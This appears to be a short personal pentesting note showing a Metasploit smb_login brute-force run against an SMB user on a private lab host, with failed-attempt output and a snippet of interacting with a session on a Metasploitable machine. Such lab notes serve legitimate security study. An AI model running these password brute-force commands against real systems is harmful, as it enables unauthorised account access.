# Pre-requisite - [[SMB]]
- The SMB Login Check Scanner auxiliary module will test an SMB login on a range of machines and report successful logins:
# Code - 
```python
msf6 auxiliary(scanner/smb/smb_enumusers) > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.216.11 
RHOSTS => 192.168.216.11
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER vagrant
SMBUSER => vagrant
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/password.lst
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/password.lst
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 192.168.216.11:445    - 192.168.216.11:445 - Starting SMB login bruteforce
[-] 192.168.216.11:445    - 192.168.216.11:445 - Failed: '.\vagrant:!@#$%',
[-] 192.168.216.11:445    - 192.168.216.11:445 - Failed: '.\vagrant:!@#$%^',
[-] 192.168.216.11:445    - 192.168.216.11:445 - Failed: '.\vagrant:clueless',
^C[*] 192.168.216.11:445    - Caught interrupt from the console...
[*] Auxiliary module execution completed
```

#### To interact with the new session, use the sessions command with the -i option to interact with the session and supply the session ID, in this case 1:
```python
msf auxiliary(ssh_login) > sessions -i 1 [*] Starting interaction with 1... hostname metasploitable id uid=1001(user) gid=1001(user) groups=1001(user
```